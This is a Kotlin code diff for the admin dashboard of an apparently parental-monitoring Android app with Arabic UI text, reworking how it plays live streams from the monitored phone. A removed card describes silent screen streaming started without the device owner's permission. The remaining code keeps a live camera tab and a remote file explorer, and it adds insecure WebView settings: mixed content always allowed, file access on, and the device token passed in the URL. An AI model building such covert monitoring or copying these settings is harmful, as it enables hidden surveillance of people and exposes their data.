@@ -1061,8 +1061,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                             listOf(
                                 Triple(0, Icons.Default.Home, "الرئيسية"),
                                 Triple(1, Icons.Default.GridView, "الأوامر"),
-                                Triple(2, Icons.Default.Tv, "البث"),
-                                Triple(3, Icons.Default.Folder, "الملفات")
+                                Triple(2, Icons.Default.Folder, "الملفات")
                             ).forEach { (index, icon, label) ->
                                 val isSelected = bottomNavSelectedTab == index
                                 val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
@@ -1076,7 +1075,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                                         .background(backgroundColor)
                                         .clickable {
                                             bottomNavSelectedTab = index
-                                            if (index == 0 || index == 2 || index == 3) openCommandDetails = null
+                                            if (index == 0) openCommandDetails = null
                                         },
                                     contentAlignment = Alignment.Center
                                 ) {
@@ -1198,8 +1197,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                     when (bottomNavSelectedTab) {
                         0 -> DeviceHomeTab(activeDevice, viewModel)
                         1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
-                        2 -> LiveStreamRequirementsPage(viewModel)
-                        3 -> DeviceFilesExplorerTab(viewModel)
+                        2 -> DeviceFilesExplorerTab(viewModel)
                     }
                 }
             }
@@ -3546,7 +3544,8 @@ fun CameraLiveTab(viewModel: AdminViewModel) {
                                 Text("في انتظار استجابة هاتف الطفل...", color = Color(0xFF6B7280), fontSize = 14.sp)
                             }
                         } else if (isStreamingActive) {
-                            if (!streamUrl.isNullOrBlank()) {
+                            val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
+                            if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
                                 LiveStreamPlayer(
                                     streamUrl = streamUrl,
                                     deviceToken = viewModel.selectedDeviceToken.value,
@@ -3619,21 +3618,6 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
         verticalArrangement = Arrangement.spacedBy(12.dp)
     ) {
         Card(
-            colors = CardDefaults.cardColors(containerColor = Color(0xFFEFF6FF)),
-            border = BorderStroke(1.dp, Color(0xFFBFDBFE)),
-            modifier = Modifier.fillMaxWidth()
-        ) {
-            Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
-                Icon(Icons.Default.Tv, contentDescription = null, tint = Color(0xFF3B82F6), modifier = Modifier.size(24.dp))
-                Spacer(modifier = Modifier.width(12.dp))
-                Column {
-                    Text("بث الشاشة المباشر (MediaCodec + WebSocket)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF1E3A8A))
-                    Text("يرسل أمر stream_screen لتطبيق الطفل لبدء بث الشاشة فورياً بالخلفية وبصمت بدون طلب إذن من خلال تقنية الترميز والوب سوكيت.", fontSize = 11.sp, color = Color(0xFF1E40AF))
-                }
-            }
-        }
-
-        Card(
             colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
             border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF39D353) else if (isLoading) Color(0xFF9155FF) else Color(0xFFE5E7EB)),
             modifier = Modifier.fillMaxWidth()
@@ -3674,7 +3658,8 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
                             Text("في انتظار استجابة الطفل...", color = Color(0xFF6B7280), fontSize = 12.sp)
                         }
                     } else if (isStreamingActive) {
-                        if (!streamUrl.isNullOrBlank()) {
+                        val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
+                        if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
                             LiveStreamPlayer(streamUrl = streamUrl, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
                             IconButton(onClick = { showFullscreenStream = streamUrl }, modifier = Modifier.align(Alignment.BottomEnd).padding(4.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape)) {
                                 Icon(Icons.Default.Fullscreen, null, tint = Color.White)
@@ -3719,7 +3704,12 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
     showFullscreenStream?.let { url ->
         Dialog(onDismissRequest = { showFullscreenStream = null }) {
             Box(modifier = Modifier.fillMaxSize().clickable { showFullscreenStream = null }.background(Color.Black), contentAlignment = Alignment.Center) {
-                LiveStreamPlayer(streamUrl = url, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
+                val isWebRtcSignaling = !url.isNullOrBlank() && (url.contains("webrtc") || url.contains("signaling") || url.contains("render.com"))
+                if (!isWebRtcSignaling) {
+                    LiveStreamPlayer(streamUrl = url, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
+                } else {
+                    Text("لا يمكن عرض البث عبر بروتوكول الإشارة", color = Color.White)
+                }
             }
         }
     }
@@ -5631,58 +5621,44 @@ fun LiveStreamPlayer(
     modifier: Modifier = Modifier
 ) {
     val context = androidx.compose.ui.platform.LocalContext.current
-    val isWebSocketMediaCodec = !streamUrl.isNullOrBlank() && 
-            (streamUrl.startsWith("http://", ignoreCase = true) || 
-             streamUrl.startsWith("https://", ignoreCase = true) || 
-             streamUrl.contains("webrtc", ignoreCase = true) || 
-             streamUrl.contains("signaling", ignoreCase = true) || 
-             streamUrl.contains("mediacodec", ignoreCase = true) || 
-             streamUrl.contains("websocket", ignoreCase = true) || 
-             streamUrl.contains("render.com", ignoreCase = true))
+    var useWebPlayer by remember(streamUrl) {
+        val isSocketStream = streamUrl.startsWith("ws://", ignoreCase = true) ||
+                streamUrl.startsWith("wss://", ignoreCase = true) ||
+                streamUrl.contains("websocket", ignoreCase = true)
+        mutableStateOf(isSocketStream)
+    }
 
     Box(modifier = modifier) {
-        if (isWebSocketMediaCodec) {
+        if (useWebPlayer) {
+            val encodedUrl = remember(streamUrl, deviceToken) {
+                try {
+                    val baseAsset = "file:///android_asset/web_stream.html"
+                    val wsParam = java.net.URLEncoder.encode(streamUrl, "UTF-8")
+                    val tokenParam = deviceToken?.let { java.net.URLEncoder.encode(it, "UTF-8") } ?: ""
+                    "$baseAsset?ws=$wsParam&token=$tokenParam"
+                } catch (e: Exception) {
+                    "file:///android_asset/web_stream.html"
+                }
+            }
+
             AndroidView(
                 factory = { ctx ->
                     android.webkit.WebView(ctx).apply {
-                        settings.javaScriptEnabled = true
-                        settings.domStorageEnabled = true
-                        settings.mediaPlaybackRequiresUserGesture = false
-                        settings.useWideViewPort = true
-                        settings.loadWithOverviewMode = true
-                        webViewClient = android.webkit.WebViewClient()
-                        webChromeClient = object : android.webkit.WebChromeClient() {
-                            override fun onPermissionRequest(request: android.webkit.PermissionRequest?) {
-                                request?.grant(request.resources)
-                            }
+                        settings.apply {
+                            javaScriptEnabled = true
+                            domStorageEnabled = true
+                            allowFileAccess = true
+                            allowContentAccess = true
+                            mediaPlaybackRequiresUserGesture = false
+                            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                         }
-                        loadUrl(streamUrl)
+                        webViewClient = android.webkit.WebViewClient()
+                        webChromeClient = android.webkit.WebChromeClient()
+                        loadUrl(encodedUrl)
                     }
                 },
                 modifier = Modifier.fillMaxSize()
             )
-
-            Row(
-                modifier = Modifier
-                    .align(androidx.compose.ui.Alignment.TopEnd)
-                    .padding(8.dp)
-                    .background(Color.Black.copy(alpha = 0.7f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
-                    .padding(horizontal = 10.dp, vertical = 6.dp),
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                Box(
-                    modifier = Modifier
-                        .size(8.dp)
-                        .background(Color(0xFF3B82F6), androidx.compose.foundation.shape.CircleShape)
-                )
-                Spacer(Modifier.width(6.dp))
-                Text(
-                    text = "بث (MediaCodec + WebSocket) مباشر ومضغوط 📡",
-                    color = Color.White,
-                    fontSize = 11.sp,
-                    fontWeight = FontWeight.Bold
-                )
-            }
         } else {
             val exoPlayer = remember(streamUrl) {
                 val loadControl = androidx.media3.exoplayer.DefaultLoadControl.Builder()
@@ -5723,27 +5699,41 @@ fun LiveStreamPlayer(
                 },
                 modifier = Modifier.fillMaxSize()
             )
+        }
 
-            Row(
-                modifier = Modifier
-                    .align(androidx.compose.ui.Alignment.TopEnd)
-                    .padding(8.dp)
-                    .background(Color.Black.copy(alpha = 0.7f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
-                    .padding(horizontal = 10.dp, vertical = 6.dp),
-                verticalAlignment = Alignment.CenterVertically
+        // Top toggle bar overlay for high flexibility
+        Row(
+            modifier = Modifier
+                .align(androidx.compose.ui.Alignment.TopStart)
+                .padding(8.dp)
+                .background(Color.Black.copy(alpha = 0.75f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
+                .padding(horizontal = 4.dp, vertical = 4.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            Button(
+                onClick = { useWebPlayer = false },
+                colors = ButtonDefaults.buttonColors(
+                    containerColor = if (!useWebPlayer) Color(0xFF9155FF) else Color.Transparent,
+                    contentColor = Color.White
+                ),
+                shape = androidx.compose.foundation.shape.RoundedCornerShape(6.dp),
+                contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
+                modifier = Modifier.height(28.dp)
             ) {
-                Box(
-                    modifier = Modifier
-                        .size(8.dp)
-                        .background(Color(0xFF39D353), androidx.compose.foundation.shape.CircleShape)
-                )
-                Spacer(Modifier.width(6.dp))
-                Text(
-                    text = "بث مشغل الفيديو الآمن (RTSP/RTMP)",
-                    color = Color.White,
-                    fontSize = 11.sp,
-                    fontWeight = FontWeight.Bold
-                )
+                Text("ExoPlayer RTSP", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+            }
+            Spacer(Modifier.width(4.dp))
+            Button(
+                onClick = { useWebPlayer = true },
+                colors = ButtonDefaults.buttonColors(
+                    containerColor = if (useWebPlayer) Color(0xFF9155FF) else Color.Transparent,
+                    contentColor = Color.White
+                ),
+                shape = androidx.compose.foundation.shape.RoundedCornerShape(6.dp),
+                contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
+                modifier = Modifier.height(28.dp)
+            ) {
+                Text("البث الحي WebSocket", fontSize = 10.sp, fontWeight = FontWeight.Bold)
             }
         }
     }
